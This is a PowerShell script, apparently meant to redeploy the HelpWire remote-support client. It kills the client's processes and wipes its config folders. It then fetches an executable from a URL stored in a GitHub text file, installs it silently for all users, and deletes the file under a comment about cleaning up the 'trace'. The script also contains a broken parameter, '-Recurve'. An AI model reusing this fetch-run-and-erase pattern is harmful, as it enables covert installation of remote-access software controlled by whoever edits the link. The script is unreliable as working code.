# --- CONFIGURATION ---
# Replace with the RAW URLs of your text file on GitHub
$GitHubTxtUrl = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/helpwire_link.txt"
$DownloadDir  = "$env:TEMP\HelpWireRecovery"
$ExePath      = "$DownloadDir\HelpWireClient.exe"

# 1. Kill any stubborn, active HelpWire client processes
Write-Host "Stopping existing HelpWire processes..." -ForegroundColor Cyan
Get-Process -Name "*HelpWire*" -ErrorAction SilentlyContinue | Stop-Process -Force

# 2. Clear old session tokens/cache so the client registers perfectly fresh
Write-Host "Purging old configuration caches..." -ForegroundColor Cyan
$AppDataPaths = @(
    "$env:ProgramData\HelpWire",
    "$env:AppData\HelpWire",
    "$env:LocalAppData\HelpWire"
)
foreach ($Path in $AppDataPaths) {
    if (Test-Path $Path) {
        Remove-Item -Path $Path -Recurve -Force -ErrorAction SilentlyContinue
    }
}

# 3. Ensure the temp download directory is ready
if (-not (Test-Path $DownloadDir)) {
    New-Item -ItemType Directory -Path $DownloadDir | Out-Null
}

try {
    # 4. Fetch the target download link from GitHub
    Write-Host "Fetching the new client link from GitHub..." -ForegroundColor Cyan
    $DownloadUrl = (Invoke-WebRequest -Uri $GitHubTxtUrl -UseBasicParsing).Content.Trim()

    if ([string]::IsNullOrEmpty($DownloadUrl) -or $DownloadUrl -notlike "http*") {
        Write-Error "Error: helpwire_link.txt on GitHub is empty or invalid."
        exit 1
    }

    # 5. Download the executable
    Write-Host "Downloading HelpWire installer..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $ExePath -UseBasicParsing

    if (Test-Path $ExePath) {
        Write-Host "Download complete. Starting silent background installation..." -ForegroundColor Green
        
        # Runs the custom executable completely hidden and automatically accepts parameters
        $Process = Start-Process -FilePath $ExePath -ArgumentList "/S", "/allusers", "/quiet" -Wait -NoNewWindow -PassThru
        
        if ($Process.ExitCode -eq 0) {
            Write-Host "HelpWire successfully linked and deployed!" -ForegroundColor Green
        } else {
            Write-Warning "Installer completed with non-zero exit code: $($Process.ExitCode)"
        }
    } else {
        Write-Error "Critical Error: Executable was not found on disk after download."
    }

} catch {
    Write-Error "An unexpected error occurred during execution: $_"
} finally {
    # Clean up file trace
    if (Test-Path $ExePath) {
        Remove-Item -Path $ExePath -Force -ErrorAction SilentlyContinue
    }
}
